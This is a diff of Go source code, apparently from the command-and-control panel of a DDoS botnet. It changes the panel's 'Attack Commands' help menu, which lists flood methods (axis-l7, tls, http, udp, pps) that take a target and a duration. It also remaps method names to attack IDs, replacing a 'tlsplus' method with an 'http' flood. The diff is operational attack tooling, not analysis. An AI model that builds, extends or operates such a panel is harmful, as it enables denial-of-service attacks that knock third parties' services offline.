@@ -140,8 +140,8 @@ func showHelp(user *RelayUser) {
 	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAttack Commands:\x1b[1;34m                         ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <target> <duration>\x1b[1;34m            ║\r\n"))
-	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus <target> <duration>\x1b[1;34m            ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtls <target> <duration>\x1b[1;34m                ║\r\n"))
+	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp <target> <duration>\x1b[1;34m               ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <target> <duration>\x1b[1;34m                ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <target> <duration>\x1b[1;34m                ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
@@ -153,7 +153,7 @@ func showHelp(user *RelayUser) {
 	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:\x1b[1;34m                              ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 1.2.3.4 300\x1b[1;34m                    ║\r\n"))
-	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus example.com 600\x1b[1;34m                ║\r\n"))
+	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp example.com 600\x1b[1;34m                  ║\r\n"))
 	conn.Write([]byte("\x1b[1;34m╚══════════════════════════════════════════╝\x1b[0m\r\n"))
 	conn.Write([]byte("\r\n"))
 }
@@ -210,10 +210,10 @@ func getAttackID(method string) uint8 {
 	switch method {
 	case "axis-l7", "l7":
 		return 7
-	case "tlsplus", "tls+":
-		return 5
 	case "tls":
 		return 4
+	case "http":
+		return 5
 	case "cf":
 		return 6
 	case "udp":
